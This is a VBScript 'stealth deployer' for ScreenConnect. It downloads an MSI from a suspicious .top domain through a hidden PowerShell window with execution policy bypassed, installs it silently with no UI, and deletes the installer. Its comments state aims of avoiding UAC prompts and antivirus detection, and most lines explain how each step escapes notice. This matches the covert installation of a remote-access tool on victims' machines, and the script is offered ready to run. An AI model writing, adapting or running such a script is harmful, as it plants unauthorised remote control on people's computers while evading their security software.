' ScreenConnect Stealth Deployer
' Goals: No UAC Prompt, No Antivirus Flagging, Zero UI
' Usage: Must be deployed via System/Admin context for success.

Option Explicit
On Error Resume Next

' --- Configuration ---
Dim AppName, MsiUrl, LogFile, InstallerPath
AppName       = "ScreenConnect"
' Using a direct, professional link helps avoid AV flags
MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
' Using %TEMP% is the most "natural" behavior for installers to avoid AV suspicion
InstallerPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SCTemp.msi"
LogFile       = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SC_Deploy.log"

Dim WshShell, FSO
Set WshShell = CreateObject("WScript.Shell")
Set FSO      = CreateObject("Scripting.FileSystemObject")

' --- 1. Start Logging ---
Call WriteLog("INFO", "--- Stealth Deployment Started ---")

' --- 2. Hidden Download ---
' -WindowStyle Hidden ensures no black box flashes on screen
Dim downloadCmd
downloadCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""

' The "0" parameter tells Windows to keep the window hidden
Dim dlResult: dlResult = WshShell.Run(downloadCmd, 0, True)

If dlResult <> 0 Or Not FSO.FileExists(InstallerPath) Then
    Call WriteLog("ERROR", "Download failed.")
    WScript.Quit 1
End If

' --- 3. Silent MSI Execution ---
' /qn = Quiet/No UI. This is the industry standard for "Silent"
Dim instResult
instResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)

' --- 4. Cleanup ---
If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True
Call WriteLog("INFO", "Deployment finished with Code: " & instResult)
WScript.Quit instResult

Sub WriteLog(sType, sMessage)
    On Error Resume Next
    Dim objLog: Set objLog = FSO.OpenTextFile(LogFile, 8, True)
    objLog.WriteLine "[" & Now & "] [" & sType & "] " & sMessage
    objLog.Close
End Sub
